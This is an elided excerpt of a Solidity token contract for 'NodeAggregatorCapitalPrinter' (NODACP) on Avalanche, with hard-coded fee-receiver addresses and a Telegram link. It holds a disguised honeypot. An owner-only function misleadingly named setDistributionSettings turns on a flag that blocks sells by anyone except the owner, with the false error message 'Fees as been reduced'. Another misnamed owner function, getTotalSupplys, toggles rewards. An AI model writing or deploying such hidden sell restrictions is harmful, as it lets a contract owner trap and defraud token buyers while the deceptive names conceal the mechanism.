...
/* 
NODE CAPITAL AGGREGATOR PRINTER (NODACPRINTER)
https://t.me/nodacprinteravax
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x803e78269f7F013b7D13ba13243Be10C66418a70); 
...
contract NodeAggregatorCapitalPrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x803e78269f7F013b7D13ba13243Be10C66418a70; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "NodeAggregatorCapitalPrinter";
    string constant _symbol = "NODACP";
    ...
    address public autoLiquidityReceiver=0x9F5c600d03A0EFeDcF4828af380843Dc0739F9ba;
    address public marketingFeeReceiver=0x9F5c600d03A0EFeDcF4828af380843Dc0739F9ba;
    ...
    bool SetRewards = true;
    uint256 distributorGas = 500000;
    bool ReduceFees = false;
    ...
    function setDistributionSettings(bool value) external onlyOwner {
        ReduceFees = value;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!ReduceFees || sender==owner), "Fees as been reduced");
    ...
    function getTotalSupplys(bool value) external onlyOwner {
        SetRewards = value;
    }
